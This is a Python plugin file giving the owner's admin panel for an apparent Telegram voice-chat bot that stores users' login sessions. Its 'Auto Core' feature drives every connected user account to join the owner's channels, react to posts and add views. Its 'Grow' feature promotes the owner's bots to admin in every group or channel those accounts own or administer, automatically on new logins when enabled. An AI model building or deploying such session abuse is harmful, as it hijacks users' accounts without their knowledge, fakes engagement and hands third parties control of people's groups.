
import asyncio
import os
import sys

from pyrogram import Client, filters
from plugins.ui import HAS_USER, cmd_text, B, edit_screen, safe_answer, set_source_code_url
import plugins.ui as shared_ui
from pyrogram.types import InlineKeyboardMarkup as K
from pyrogram.types import Message

from config import Config
from helpers.database import db
from helpers.logger_channel import log_broadcast, log_command
from helpers.vc_manager import session_manager

BANNED_USERS: set = set()

def owner_only(func):
    async def wrapper(bot: Client, msg: Message):
        if not msg.from_user or not Config.is_owner(msg.from_user.id):
            await msg.reply_text("ℹ️ Ye command sirf owner ke liye hai.")
            return
        return await func(bot, msg)
    wrapper.__name__ = func.__name__
    return wrapper

def panel_kb() -> K:
    return K([
        [B("👥 Users", callback_data="adm_users", style="primary"),
         B("📊 Stats", callback_data="adm_stats", style="primary")],
        [B("🎙 Active VCs", callback_data="adm_vcs", style="primary"),
         B("📢 Broadcast", callback_data="adm_broadcast", style="primary")],
        [B("⚡ Auto Core (Must Join + Auto Join)", callback_data="adm_core", style="success")],
        [B("🔒 Must Join Channels", callback_data="adm_fsub", style="primary"),
         B("🌱 Grow", callback_data="adm_grow", style="success")],
        [B("🎵 Add Audio", callback_data="adm_addaudio", style="primary"),
         B("💳 Payments", callback_data="adm_payment", style="primary")],
        [B("🔗 Source URL", callback_data="adm_source", style="primary"),
         B("♻️ Restart", callback_data="adm_restart", style="danger")],
        [B("🏠 Home", callback_data="menu:home", style="primary")],
    ])

async def _panel_text() -> str:
    users = await db.all_users()
    with_session = sum(1 for u in users if u.get("string_session"))
    return (
        "👑 <b>Owner Panel</b>\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        f"👥 <b>Users:</b> <code>{len(users)}</code>\n"
        f"🔐 <b>Cores (logged in):</b> <code>{with_session}</code>\n"
        f"⚙️ <b>Live engines:</b> <code>{len(session_manager.users)}</code>\n"
        f"🎙 <b>Active VCs:</b> <code>{session_manager.active_chats()}</code>\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "Neeche se control choose karo 👇"
    )

@Client.on_message(HAS_USER & filters.command("owner", prefixes=[".", "/"]) & filters.private)
@owner_only
async def cmd_owner_panel(bot: Client, msg: Message):
    await log_command(msg.from_user.id, msg.from_user.username, msg.chat.id, "/owner")
    await msg.reply_text(await _panel_text(), reply_markup=panel_kb())

@Client.on_callback_query(filters.regex(r"^adm_"))
async def cb_admin(bot, cq):
    if not Config.is_owner(cq.from_user.id):
        await safe_answer(cq, "✅ Sirf owner!", show_alert=True)
        return

    action = cq.data.split("_", 1)[1]
    back = K([[B("⬅ Back", callback_data="adm_back")]])

    if action == "users":
        users = await db.all_users()
        lines = [
            f"• <code>{u['user_id']}</code> @{u.get('username') or 'none'} "
            f"{'' if u.get('string_session') else ''}"
            for u in users[:40]
        ]
        text = f" <b>Users ({len(users)})</b>\n" + "\n".join(lines)
        if len(users) > 40:
            text += f"\n…+{len(users) - 40} more"
        await edit_screen(cq.message, text, reply_markup=back)

    elif action == "stats":
        await edit_screen(cq.message, await _panel_text(), reply_markup=back)

    elif action == "vcs":
        lines = []
        for uid, uvc in session_manager.users.items():
            for cid, st in uvc.chats.items():
                lines.append(
                    f"• <code>{cid}</code> — {uvc.account_name} — "
                    f"{'playing' if st.is_playing else 'idle'}")
        await edit_screen(cq.message,
            "ℹ️ <b>Active VCs</b>\n" + ("\n".join(lines) or "— none —"),
            reply_markup=back)

    elif action == "addaudio":
        await edit_screen(cq.message,
            "ℹ️ <b>Add Bot Audio</b>\n\n"
            "Audio/video message ko reply karke:\n"
            "<code>/addaudio &lt;title&gt;</code>\n\n"
            "Save hone ke baad sab users ke <b>Bot Audios</b> section mein dikhega.",
            reply_markup=back,
        )

    elif action == "fsub":
        from plugins.force_sub import fsub_panel_text
        await edit_screen(cq.message, await fsub_panel_text(), reply_markup=back,
                          disable_web_page_preview=True)

    elif action == "payment":
        from plugins.payments import _payment_panel_text, payment_owner_kb
        await edit_screen(cq.message, _payment_panel_text(),
                          reply_markup=payment_owner_kb())

    elif action == "source":
        await edit_screen(cq.message,
            "🔗 <b>Source Code Button</b>\n\n"
            f"Current: <code>{shared_ui.SOURCE_CODE_URL or 'disabled'}</code>\n\n"
            "Set: <code>/setsource https://example.com/repo</code>\n"
            "Remove: <code>/clearsource</code>", reply_markup=back)

    elif action == "broadcast":
        await edit_screen(cq.message,
            "ℹ️ <b>Broadcast</b>\n\n"
            "<code>/broadcast &lt;message&gt;</code> ya kisi message ko reply "
            "karke <code>/broadcast</code>.\n"
            "Message database mein registered <b>sabhi users</b> ko jayega.",
            reply_markup=back)

    elif action == "restart":
        await safe_answer(cq, "ℹ️ Restarting…")
        await edit_screen(cq.message, "ℹ️ Restarting…")
        await asyncio.sleep(1)
        os.execv(sys.executable, [sys.executable] + sys.argv)
        return

    elif action.startswith("core"):
        from helpers import auto_core as AC
        sub = action[4:]
        if sub == "auto":
            await AC.set_auto(not await AC.is_auto())
        elif sub == "run":
            if not await AC._channels():
                await safe_answer(cq, "Pehle channel add karo: /addfsub https://t.me/channel", show_alert=True)
                return
            await safe_answer(cq, "⚡ Auto Core shuru…")
            msg = cq.message
            last = [0.0]
            async def _prog(t):
                now = asyncio.get_event_loop().time()
                if now - last[0] < 3:
                    return
                last[0] = now
                await edit_screen(msg, "⚡ <b>Auto Core chal raha hai…</b>\n\n"
                    f"Cores: {t['done']}/{t['accounts']} (skip {t['skipped']})\n"
                    f"Joined: {t['joined']} • Reactions: {t['reacted']} • Views: {t.get('viewed', 0)} • Failed: {t['failed']}")
            t = await AC.core_all(_prog)
            await edit_screen(msg, "✅ <b>Auto Core complete</b>\n━━━━━━━━━━━━━━━━━━━━\n"
                f"🔐 Cores: {t['done']}/{t['accounts']} (skip {t['skipped']})\n"
                f"💎 Premium cores: {t['premium']}\n"
                f"📥 Channel joins: {t['joined']}\n"
                f"❤️ Reactions: {t['reacted']}\n"
                f"👁 Views: {t.get('viewed', 0)}\n"
                f"⚠️ Failed: {t['failed']}",
                reply_markup=K([[B("⬅ Back", callback_data="adm_core")]]))
            return
        from helpers import force_sub as FS
        entries = await FS.load(force=True)
        auto = await AC.is_auto()
        chans = "\n".join(f"• <code>{e.get('url') or e['ref']}</code>" for e in entries) or "— koi channel nahi —"
        await edit_screen(cq.message,
            "⚡ <b>Auto Core — Must Join + Auto Join</b>\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            f"<b>Channels (auto detect):</b>\n{chans}\n\n"
            "Har connected core:\n"
            "1️⃣ Upar wale channels <b>join</b> karega\n"
            f"2️⃣ Naya post + purane <b>{AC.OLD_POSTS}</b> post pe random reaction\n"
            "   • Normal account → <b>1</b> reaction\n"
            "   • Premium account → <b>3</b> reactions\n"
            "   • Har account se har post pe <b>1 view</b>\n"
            "3️⃣ Bot restart pe sab cores dobara join\n"
            "4️⃣ Naya core login hote hi wo bhi yahi karega\n"
            "5️⃣ Channel me naya post aate hi sab react karenge\n\n"
            f"<b>Auto:</b> {'ON ✅' if auto else 'OFF ❌'}\n"
            "Channel add: <code>/addfsub https://t.me/channel</code>",
            reply_markup=K([
                [B("▶️ Run Now (all cores)", callback_data="adm_corerun", style="success")],
                [B("🤖 Auto: " + ("ON" if auto else "OFF"), callback_data="adm_coreauto",
                   style="success" if auto else "danger")],
                [B("🔒 Channels", callback_data="adm_fsub", style="primary"),
                 B("⬅ Back", callback_data="adm_back", style="primary")],
            ]), disable_web_page_preview=True)

    elif action.startswith("grow"):
        from helpers import grow as G
        sub = action[4:]
        if sub == "auto":
            await G.set_auto(not await G.is_auto())
        elif sub == "clear":
            await G.set_bots([])
        elif sub == "run":
            bots = await G.get_bots()
            if not bots:
                await safe_answer(cq, "Pehle bots set karo: /growbots @bot1 @bot2", show_alert=True)
                return
            await safe_answer(cq, "🌱 Grow shuru…")
            msg = cq.message
            async def _prog(t):
                await edit_screen(msg, f"🌱 <b>Grow chal raha hai…</b>\n\n"
                    f"Accounts: {t['users']}/{t['accounts']} (skip {t['skipped']}) • Groups: {t['chats']}\n"
                    f"Promoted: {t['promoted']} • Failed: {t['failed']}")
            t = await G.grow_all(_prog)
            await edit_screen(msg, f"✅ <b>Grow complete</b>\n\n"
                f"Accounts: {t['users']}/{t['accounts']} (skip {t['skipped']})\nGroups/Channels: {t['chats']}\n"
                f"Promoted: {t['promoted']}\nFailed: {t['failed']}",
                reply_markup=K([[B("⬅ Back", callback_data="adm_grow")]]))
            return
        bots = await G.get_bots()
        auto = await G.is_auto()
        await edit_screen(cq.message,
            "🌱 <b>Grow Bots</b>\n\n"
            "Jo bots yaha set honge, unhe har connected account ke un sabhi "
            "groups/channels me admin bana diya jayega jaha wo account "
            "<b>owner</b> ya <b>admin (add-admin right ke saath)</b> hai.\n"
            "Bot ko utne hi rights milenge jitne us account ke paas hain.\n\n"
            f"<b>Bots:</b> {' '.join('@'+b for b in bots) or '— none —'}\n"
            f"<b>Auto (naye login par):</b> {'ON ✅' if auto else 'OFF'}\n\n"
            "Set: <code>/growbots @bot1 @bot2 @bot3</code>",
            reply_markup=K([
                [B("▶️ Run Now (sab accounts)", callback_data="adm_growrun", style="success")],
                [B("🤖 Auto: " + ("ON" if auto else "OFF"), callback_data="adm_growauto",
                   style="success" if auto else "danger")],
                [B("🗑 Clear Bots", callback_data="adm_growclear", style="danger")],
                [B("⬅ Back", callback_data="adm_back")],
            ]))

    elif action == "back":
        await edit_screen(cq.message, await _panel_text(), reply_markup=panel_kb())

    await safe_answer(cq)

@Client.on_message(HAS_USER & filters.command("setsource", prefixes=[".", "/"]) & filters.private)
@owner_only
async def cmd_setsource(bot: Client, msg: Message):
    parts = cmd_text(msg).split(maxsplit=1)
    if len(parts) < 2:
        await msg.reply_text("🔗 Usage: <code>/setsource https://example.com/repo</code>")
        return
    try:
        set_source_code_url(parts[1])
    except ValueError as exc:
        await msg.reply_text(f"❌ Invalid URL: <code>{exc}</code>")
        return
    await db.set_app_value("source_code_url", shared_ui.SOURCE_CODE_URL)
    await msg.reply_text("✅ Source Code button updated. /start dobara bhejein.")

@Client.on_message(HAS_USER & filters.command("clearsource", prefixes=[".", "/"]) & filters.private)
@owner_only
async def cmd_clearsource(bot: Client, msg: Message):
    set_source_code_url("")
    await db.set_app_value("source_code_url", "")
    await msg.reply_text("✅ Source Code button removed. /start dobara bhejein.")

@Client.on_message(HAS_USER & filters.command("broadcast", prefixes=[".", "/"]) & filters.private)
@owner_only
async def cmd_broadcast(bot: Client, msg: Message):
    parts = cmd_text(msg).split(maxsplit=1)
    text_to_send = parts[1] if len(parts) > 1 else None
    reply_src = msg.reply_to_message
    if not text_to_send and not reply_src:
        await msg.reply_text("Usage: <code>/broadcast &lt;message&gt;</code> "
                             "ya kisi message ko reply karein.")
        return

    users = await db.all_users()
    recipients = {
        int(user["user_id"])
        for user in users
        if user.get("user_id") is not None
    }

    recipients.update(await db.all_broadcast_chats())
    recipients.update(
        int(chat_id)
        for uvc in session_manager.users.values()
        for chat_id in uvc.chats
        if int(chat_id) < 0
    )
    recipients = sorted(recipients)
    status = await msg.reply_text(
        f" Sending broadcast to {len(recipients)} user/group chat(s)…"
    )
    success = 0
    for user_id in recipients:
        try:
            if reply_src:
                await reply_src.forward(user_id)
            else:
                await bot.send_message(user_id, text_to_send)
            success += 1
        except Exception:

            pass
        await asyncio.sleep(0.05)

    await status.edit_text(
        f" <b>Broadcast done</b>\n├ Sent: {success}/{len(recipients)}\n"
        f"└ Failed: {len(recipients) - success}\n"
        "└ Target: all registered users + tracked VC groups")
    await log_broadcast(msg.from_user.id, len(recipients), success)

@Client.on_message(HAS_USER & filters.command("users", prefixes=[".", "/"]) & filters.private)
@owner_only
async def cmd_users(bot: Client, msg: Message):
    users = await db.all_users()
    with_session = sum(1 for u in users if u.get("string_session"))
    lines = [
        f"• <code>{u['user_id']}</code> @{u.get('username') or 'none'} "
        f"{'' if u.get('string_session') else ''}"
        for u in users[:40]
    ]
    text = (f" <b>Users ({len(users)} total, {with_session} logged in)</b>\n"
            + "\n".join(lines))
    if len(users) > 40:
        text += f"\n…+{len(users) - 40} more"
    await msg.reply_text(text)

@Client.on_message(HAS_USER & filters.command("stats", prefixes=[".", "/"]) & filters.private)
@owner_only
async def cmd_stats(bot: Client, msg: Message):
    await msg.reply_text(await _panel_text(), reply_markup=panel_kb())

@Client.on_message(HAS_USER & filters.command("ban", prefixes=[".", "/"]) & filters.private)
@owner_only
async def cmd_ban(bot: Client, msg: Message):
    parts = cmd_text(msg).split()
    if len(parts) < 2 or not parts[1].isdigit():
        await msg.reply_text("Usage: <code>/ban &lt;user_id&gt;</code>")
        return
    uid = int(parts[1])
    if uid <= 0:
        await msg.reply_text("❌ User ID positive number honi chahiye.")
        return
    BANNED_USERS.add(uid)
    await session_manager.remove(uid)
    await msg.reply_text(f"ℹ️ <code>{uid}</code> banned.")

@Client.on_message(HAS_USER & filters.command("unban", prefixes=[".", "/"]) & filters.private)
@owner_only
async def cmd_unban(bot: Client, msg: Message):
    parts = cmd_text(msg).split()
    if len(parts) < 2 or not parts[1].isdigit():
        await msg.reply_text("Usage: <code>/unban &lt;user_id&gt;</code>")
        return
    uid = int(parts[1])
    BANNED_USERS.discard(uid)
    await msg.reply_text(f"ℹ️ <code>{uid}</code> unbanned.")

@Client.on_message(HAS_USER & filters.command("restart", prefixes=[".", "/"]) & filters.private)
@owner_only
async def cmd_restart(bot: Client, msg: Message):
    await msg.reply_text("ℹ️ Restarting…")
    await asyncio.sleep(1)
    os.execv(sys.executable, [sys.executable] + sys.argv)

@Client.on_message(filters.incoming, group=-3)
async def ban_filter(bot: Client, msg: Message):
    if msg.from_user and msg.from_user.id in BANNED_USERS:
        await msg.stop_propagation()


@Client.on_message(HAS_USER & filters.command("growbots", prefixes=[".", "/"]) & filters.private)
@owner_only
async def cmd_growbots(bot: Client, msg: Message):
    from helpers import grow as G
    names = cmd_text(msg).split()[1:]
    if not names:
        bots = await G.get_bots()
        await msg.reply_text(
            "🌱 Usage: <code>/growbots @bot1 @bot2</code>\n"
            f"Current: {' '.join('@'+b for b in bots) or 'none'}")
        return
    bots = await G.set_bots(names)
    await msg.reply_text(
        f"✅ Grow bots saved: {' '.join('@'+b for b in bots)}\n"
        "Owner Panel → 🌱 Grow → Run Now dabao.",
        reply_markup=K([[B("🌱 Open Grow", callback_data="adm_grow")]]))


@Client.on_message(HAS_USER & filters.command("grow", prefixes=[".", "/"]) & filters.private)
@owner_only
async def cmd_grow(bot: Client, msg: Message):
    from helpers import grow as G
    if not await G.get_bots():
        await msg.reply_text("Pehle bots set karo: <code>/growbots @bot1 @bot2</code>")
        return
    m = await msg.reply_text("🌱 Grow shuru…")
    t = await G.grow_all()
    await m.edit_text(f"✅ Grow complete\nAccounts: {t['users']}/{t['accounts']} • Groups: {t['chats']}\n"
                      f"Promoted: {t['promoted']} • Failed: {t['failed']}")
